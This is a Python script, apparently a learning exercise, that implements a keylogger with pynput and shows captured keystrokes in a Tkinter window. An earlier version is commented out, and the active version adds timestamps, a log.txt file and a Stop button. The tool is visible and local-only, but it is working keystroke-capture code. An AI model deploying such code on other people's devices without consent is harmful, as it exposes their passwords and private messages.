# import tkinter as tk
# from pynput.keyboard import Listener
# import threading
#
#
# def write_to_file(key):
#     letter = str(key).replace("'", "")  # Clean up the key string
#
#     # Handle special keys
#     if letter == 'Key.space':
#         letter = ' '  # Space for spacebar
#     elif letter == 'Key.shift_r' or letter == "Key.ctrl_l":
#         letter = ''  # Ignore shift and control keys
#     elif letter == "Key.enter":
#         letter = "\n"  # Go to next line when enter is pressed
#
#     # Write the keystroke to the log file                                                        tkinter gui
#     with open("log.txt", 'a') as f:
#         f.write(letter)
#
#     # Update the label with the captured key in a neat format
#     update_label(letter)
#
#
# def update_label(letter):
#     # Get the current text from the label and append the new letter
#     current_text = label.cget("text") + letter
#
#     # Update the label text
#     label.config(text=current_text)
#
#
# def start_keylogger():
#     with Listener(on_press=write_to_file) as listener:
#         listener.join()
#
#
# # Create the Tkinter window
# window = tk.Tk()
# window.title("Keylogger with Tkinter")
# window.geometry("500x400")
#
# # Create and pack the label widget
# label = tk.Label(window, text="Captured Keystrokes", wraplength=480, anchor="w")
# label.pack(padx=10, pady=20)
#
# # Start the keylogger in a separate thread
# keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
# keylogger_thread.start()
#
# # Run the Tkinter event loop
# window.mainloop()


# ---------------------------
import tkinter as tk
from pynput.keyboard import Listener
import threading
from datetime import datetime

listener = None  # Declare listener globally

def write_to_file(key):
    letter = str(key).replace("'", "")  # Clean up the key string

    # Handle special keys
    if letter == 'Key.space':
        letter = ' '  # Space for spacebar
    elif letter == 'Key.shift_r' or letter == "Key.ctrl_l":
        letter = ''  # Ignore shift and control keys
    elif letter == "Key.enter":
        letter = "\n"  # Go to next line when enter is pressed

    # Add timestamp for each keystroke                                              -- tkinter with stop keystroke button with timestamp --
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    letter = f"{timestamp}: {letter}\n"

    # Write the keystroke to the log file
    with open("log.txt", 'a') as f:
        f.write(letter)

    # Update the label with the captured key in a neat format
    update_label(letter)


def update_label(letter):
    # Get the current text from the label and append the new letter
    current_text = text_box.get("1.0", tk.END) + letter

    # Update the text box with the new captured key
    text_box.delete("1.0", tk.END)
    text_box.insert(tk.END, current_text)


def start_keylogger():
    global listener
    listener = Listener(on_press=write_to_file)
    listener.start()


def stop_keylogger():
    global listener
    if listener is not None:
        listener.stop()
        listener.join()


# Create the Tkinter window
window = tk.Tk()
window.title("Keylogger with Tkinter")
window.geometry("600x500")

# Create a Text widget with scrollbars for better display
text_box = tk.Text(window, height=15, width=70, wrap=tk.WORD, font=("Courier", 10))
text_box.pack(padx=10, pady=10)

# Add a scrollbar for the text box
scrollbar = tk.Scrollbar(window, command=text_box.yview)
scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
text_box.config(yscrollcommand=scrollbar.set)

# Add Start/Stop button
start_stop_button = tk.Button(window, text="Stop Keylogger", command=stop_keylogger)
start_stop_button.pack(pady=10)

# Start the keylogger in a separate thread
keylogger_thread = threading.Thread(target=start_keylogger, daemon=True)
keylogger_thread.start()

# Run the Tkinter event loop
window.mainloop()

